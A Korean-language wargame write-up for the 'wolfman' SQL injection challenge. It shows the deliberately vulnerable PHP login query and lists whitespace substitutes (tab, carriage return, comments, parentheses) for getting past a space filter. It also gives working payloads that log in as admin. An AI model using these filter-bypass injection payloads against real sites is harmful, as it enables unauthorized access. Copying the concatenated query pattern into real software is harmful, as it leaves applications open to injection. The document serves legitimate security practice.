# WOLFMAN

## Problem
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

## Background Knowledge
* SQL 쿼리문에서 ` `(space) 띄어쓰기를 대체할 수 있는 것들.
	- Tab(`\t`) : `%09`
		- `'%09or%09id='admin'`
	- Line Feed (`\n`): `%0a`
		- `'%0aor%0aid='admin'`
	- Carriage Return(`\r`) : `%0d`
		- `'%0dor%0did='admin'`
	- 주석 : `/**/`
		- `'/**/or/**/id='admin'`
	- 괄호 : `()`
		- `or(id='admin')`
	- 더하기 : `+`
		- `or+id='admin'`

## Inspection
* `if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");`
	- 다른 테이블을 건들지 않도록 걸러진다.
* `if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); `
	- **space 띄어쓰기가 걸러진다.**
* `select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'`
	- 파라미터로 `pw`가 넘겨진다.

## Solution
* 띄어쓰기를 Tab이나 Carrige Return으로 대체한다.
	- `'%09or%09id='admin'%09--%09`
	- `'%0dor%0did='admin'%0d--%0d`

## Review
* [Webhacking.kr prob18](https://github.com/r4k0nb4k0n/Wargame-Challenges/tree/master/Webhacking.kr/prob18)이 생각나는 문제였다.
* Line Feed, 주석, 괄호는 쿼리문은 먹지만 통과하지 않는다.
* 더하기는 띄어쓰기로 걸러진다.